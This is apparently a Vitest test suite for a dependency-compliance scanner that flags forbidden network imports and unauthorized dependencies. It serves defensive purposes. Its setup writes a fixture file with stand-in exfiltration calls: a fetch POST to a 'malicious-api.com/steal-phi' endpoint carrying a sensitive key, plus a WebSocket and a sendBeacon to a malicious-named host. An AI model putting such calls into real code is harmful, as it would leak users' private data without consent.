import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import fs from 'fs';
import path from 'path';
import {
  auditPackageJson,
  scanFileForCompliance,
  ALLOWED_DEPENDENCIES,
  FORBIDDEN_IMPORTS
} from '../scripts/dependency_compliance.js';

describe('Dependency Compliance Guardrail', () => {
  const tempViolatingFile = path.resolve('src/temp-compliance-violating.ts');
  const tempCleanFile = path.resolve('src/temp-compliance-clean.ts');

  beforeAll(() => {
    // Write a temporary file that contains forbidden imports and calls
    fs.writeFileSync(
      tempViolatingFile,
      `
      import axios from 'axios';
      import http from 'http';
      
      export function triggerNetwork() {
        fetch('https://malicious-api.com/steal-phi', {
          method: 'POST',
          body: JSON.stringify({ phKey: 'sensitive' })
        });
        
        const socket = new WebSocket('wss://malicious.com');
        const xhr = new XMLHttpRequest();
        navigator.sendBeacon('https://malicious.com/log');
      }
      `,
      'utf8'
    );

    // Write a clean temporary file
    fs.writeFileSync(
      tempCleanFile,
      `
      import { getContrastRatio } from '../src/utils/colorUtils';
      export function generateColors() {
        return getContrastRatio('#000000', '#ffffff');
      }
      `,
      'utf8'
    );
  });

  afterAll(() => {
    if (fs.existsSync(tempViolatingFile)) fs.unlinkSync(tempViolatingFile);
    if (fs.existsSync(tempCleanFile)) fs.unlinkSync(tempCleanFile);
  });

  describe('auditPackageJson', () => {
    it('should detect unauthorized production dependencies', () => {
      // Temporarily write a package.json with an unauthorized dependency
      const originalPath = path.resolve('package.json');
      const originalContent = fs.readFileSync(originalPath, 'utf8');
      const parsed = JSON.parse(originalContent);
      
      parsed.dependencies['axios'] = '^1.0.0';
      const tempPath = path.resolve('package.json.temp');
      fs.writeFileSync(tempPath, JSON.stringify(parsed, null, 2), 'utf8');

      try {
        // Swap package.json
        fs.renameSync(originalPath, path.resolve('package.json.original'));
        fs.renameSync(tempPath, originalPath);

        const violations = auditPackageJson();
        expect(violations.length).toBeGreaterThan(0);
        expect(violations[0]).toContain("axios");
      } finally {
        // Restore original package.json
        if (fs.existsSync(path.resolve('package.json.original'))) {
          if (fs.existsSync(originalPath)) fs.unlinkSync(originalPath);
          fs.renameSync(path.resolve('package.json.original'), originalPath);
        }
        if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
      }
    });

    it('should pass if all dependencies are whitelisted', () => {
      const violations = auditPackageJson();
      expect(violations.length).toBe(0);
    });
  });

  describe('scanFileForCompliance', () => {
    it('should catch forbidden imports and unauthorized network requests', () => {
      const violations = scanFileForCompliance(tempViolatingFile);
      expect(violations.length).toBeGreaterThan(0);

      const types = violations.map(v => v.type);
      expect(types).toContain('Forbidden Network/Server-Side Import');
      expect(types).toContain('Unauthorized Network Call');

      const messages = violations.map(v => v.message);
      expect(messages.some(m => m.includes("axios"))).toBe(true);
      expect(messages.some(m => m.includes("http"))).toBe(true);
      expect(messages.some(m => m.includes("fetch"))).toBe(true);
      expect(messages.some(m => m.includes("WebSocket"))).toBe(true);
      expect(messages.some(m => m.includes("XMLHttpRequest"))).toBe(true);
      expect(messages.some(m => m.includes("sendBeacon"))).toBe(true);
    });

    it('should not flag compliant clean files', () => {
      const violations = scanFileForCompliance(tempCleanFile);
      expect(violations.length).toBe(0);
    });

    it('enforces zero network whitelist exemptions across all source files', () => {
      // Confirm that AUTHORIZED_NETWORK_FILES is empty with zero overrides allowed
      const { AUTHORIZED_NETWORK_FILES } = require('../scripts/dependency_compliance.js');
      expect(AUTHORIZED_NETWORK_FILES.size).toBe(0);
    });
  });
});
